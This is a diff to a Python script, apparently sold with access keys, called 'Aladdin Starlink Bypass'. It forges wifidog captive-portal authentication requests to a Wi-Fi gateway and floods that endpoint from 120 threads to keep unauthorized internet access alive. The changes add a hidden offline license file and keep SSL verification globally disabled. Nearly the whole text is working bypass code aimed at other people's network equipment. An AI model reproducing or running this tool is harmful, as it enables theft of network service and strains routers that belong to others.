@@ -1,8 +1,8 @@
-import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl
+import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
 from urllib.parse import urlparse, parse_qs, urljoin
 from datetime import datetime
 
-# --- SSL Error ကို လုံးဝကျော်သွားစေမယ့် အပိုင်း ---
+# --- SSL Error & Warnings Bypass ---
 try:
     _create_unverified_https_context = ssl._create_unverified_context
 except AttributeError:
@@ -11,17 +11,12 @@ else:
     ssl._create_default_https_context = _create_unverified_https_context
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-# -------------------------------------------
-
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
-# သင်၏ GitHub Raw Link ကို ဒီနေရာမှာ အစားထိုးပါ
 KEY_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Aladdin/refs/heads/main/key.txt"
+LICENSE_FILE = ".aladdin_v11.lic" # ဖုန်းထဲမှာ သိမ်းမယ့် Hidden License File
 
 def get_hwid():
-    # Device တစ်လုံးချင်းစီအတွက် မတူညီသော ID ထုတ်ပေးခြင်း
     id_str = platform.processor() + platform.node() + platform.machine()
     return hashlib.md5(id_str.encode()).hexdigest()[:16].upper()
 
@@ -39,46 +34,79 @@ def banner():
     print("\033[95m" + "        ✨ Aladdin Starlink Bypass - IMMORTAL V11 ✨")
     print("\033[93m" + " ="*35 + "\033[0m\n")
 
+def save_license(hwid, key, expiry):
+    # License ကို ဖုန်းထဲမှာ သိမ်းဆည်းခြင်း
+    data = {"id": hwid, "key": key, "expiry": expiry}
+    with open(LICENSE_FILE, "w") as f:
+        json.dump(data, f)
+
+def load_license():
+    # ဖုန်းထဲက License ကို ပြန်ဖတ်ခြင်း
+    if os.path.exists(LICENSE_FILE):
+        try:
+            with open(LICENSE_FILE, "r") as f:
+                return json.load(f)
+        except:
+            return None
+    return None
+
 def check_license():
     hwid = get_hwid()
     banner()
+    
+    # ၁။ ဖုန်းထဲမှာ သိမ်းထားတဲ့ License ရှိမရှိ အရင်စစ်မယ် (Offline Support)
+    local_data = load_license()
+    if local_data and local_data.get("id") == hwid:
+        expiry_date = datetime.strptime(local_data["expiry"], "%d-%m-%Y")
+        if datetime.now() < expiry_date:
+            print(f"\033[92m[✓] AUTO-LOGIN SUCCESS! (Offline Mode)\033[0m")
+            print(f"\033[94m[*] EXPIRY: {local_data['expiry']}\033[0m")
+            time.sleep(1.5)
+            return True
+
+    # ၂။ ဖုန်းထဲမှာ မရှိရင် ဒါမှမဟုတ် သက်တမ်းကုန်နေရင် Online ကနေ စစ်မယ်
     print(f"\033[94m[*] YOUR DEVICE ID: {hwid}\033[0m")
     input_key = input("\033[93m[>] ENTER ACCESS KEY: \033[0m").strip()
     
+    print("\033[93m[*] Verifying license online...\033[0m")
     try:
-                # verify=False ထည့်ပြီး SSL error ကို ကျော်ခိုင်းလိုက်ပါမည်
         response = requests.get(KEY_URL, timeout=10, verify=False).text
-        
         lines = response.splitlines()
         
         for line in lines:
             if "|" in line:
-                db_id, db_key, db_date = line.split("|")
-                if db_id.strip() == hwid and db_key.strip() == input_key:
-                    expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
-                    if datetime.now() < expiry_date:
-                        print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_date}\033[0m")
-                        time.sleep(2)
-                        return True
-                    else:
-                        print("\033[91m[!] KEY EXPIRED! PLEASE RENEW.\033[0m")
-                        return False
+                parts = line.split("|")
+                if len(parts) == 3:
+                    db_id, db_key, db_date = parts
+                    if db_id.strip() == hwid and db_key.strip() == input_key:
+                        expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
+                        if datetime.now() < expiry_date:
+                            # မှန်ကန်ရင် ဖုန်းထဲမှာ သိမ်းလိုက်မယ်
+                            save_license(hwid, input_key, db_date.strip())
+                            print(f"\033[92m[✓] ACCESS GRANTED! EXPIRY: {db_date}\033[0m")
+                            time.sleep(2)
+                            return True
+                        else:
+                            print("\033[91m[!] KEY EXPIRED! PLEASE RENEW.\033[0m")
+                            return False
         
         print("\033[91m[!] INVALID KEY OR DEVICE ID NOT REGISTERED.\033[0m")
         return False
     except Exception as e:
-        print(f"\033[91m[!] DATABASE ERROR: {e}\033[0m")
+        # Internet မရှိလို့ Database ချိတ်မရရင်
+        if local_data:
+            print("\033[91m[!] Unable to connect, but found expired or invalid local license.\033[0m")
+        else:
+            print("\033[91m[!] DATABASE ERROR: Please check your internet for first-time login.\033[0m")
         return False
 
 def check_net():
     try:
-        # အင်တာနက် အစစ်ရမရကို ပိုမိုမြန်ဆန်စွာ စစ်ဆေးခြင်း
         return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
     except:
         return False
 
 def high_speed_pulse(link):
-    # Router Speed Limit ကို ကျော်ရန် Header များ ပြောင်းလဲအသုံးပြုခြင်း
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Connection": "keep-alive",
@@ -88,7 +116,7 @@ def high_speed_pulse(link):
         try:
             requests.get(link, timeout=5, verify=False, headers=headers)
             print(f"\033[92m[✓] Aladdin Bypass | STABLE >>> [{random.randint(40,180)}ms]\033[0m")
-            time.sleep(0.01) # အရှိန်အမြင့်ဆုံး ထိန်းထားရန်
+            time.sleep(0.01)
         except:
             time.sleep(1)
             break
@@ -121,10 +149,9 @@ def start_immortal():
                 auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                 
                 print("\033[95m[*] ⚡ Launching High-Speed Stable Threads ⚡\033[0m")
-                for _ in range(120): # Thread အရေအတွက် တိုးမြှင့်ထားသည်
+                for _ in range(120):
                     threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                 
-                # လိုင်းပြတ်မသွားစေရန် စောင့်ကြည့်စနစ်
                 while True:
                     if not check_net():
                         print("\033[91m[!] Connection Lost! Re-injecting...\033[0m")
@@ -136,5 +163,8 @@ def start_immortal():
             time.sleep(2)
 
 if __name__ == "__main__":
-    start_immortal()
-      
+    try:
+        start_immortal()
+    except KeyboardInterrupt:
+        print("\n\033[91m[!] Script Stopped by User.\033[0m")
+            
